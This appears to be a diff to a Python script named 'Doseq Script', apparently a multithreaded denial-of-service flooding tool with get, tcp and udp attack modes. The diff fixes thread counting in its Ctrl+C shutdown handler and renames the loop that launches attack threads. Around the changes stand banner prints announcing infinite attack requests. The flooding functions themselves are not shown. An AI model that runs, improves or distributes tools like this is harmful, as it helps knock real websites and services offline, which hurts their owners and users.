@@ -214,11 +214,10 @@ def quit(sig, fream):
     print(rd + "\n[" + yl + "!" + rd + "]" + yl + " User requested shutdown. " + rd + "..." + wi)
     time.sleep(1)
     if started:
-        threads_len = len(THREADS)
-        print(rd + "  [" + yl + "~" + rd + "]" + yl + " Aborting " + wi + f"{threads_len}" + yl + " Threads" + rd + "..." + wi)
+        print(rd + "  [" + yl + "~" + rd + "]" + yl + " Aborting " + wi + f"{threads}" + yl + " Threads" + rd + "..." + wi)
         kill()
         while True:
-            if threads_len == fin_threads:
+            if len(THREADS) == fin_threads:
                 break
 
     print(wi + "[" + gr + "*" + wi + "] Thanks For Using Doseq Script :)")
@@ -405,10 +404,10 @@ print("[" + yl + "I" + wi + "] Infinity [ " + yl + attack.upper() + wi + " ] req
 print("[" + yl + "I" + wi + "] Press " + gr + "' Ctrl+C ' " + wi + "To Stop The Attack")
 
 
-threads = round(threads / 2) if not attack in ('tcp', 'udp') else threads
+workers = round(threads / 2) if attack not in ('tcp', 'udp') else threads
 started = True
 
-for _ in range(threads):
+for _ in range(workers):
 
     if attack == 'get':
         t1 = threading.Thread(target=get_attack)
@@ -450,6 +449,7 @@ for _ in range(threads):
 for t in THREADS:
     t.join()
 
+    
 ##############################################################
 #####################                #########################
 #####################   END OF TOOL  #########################
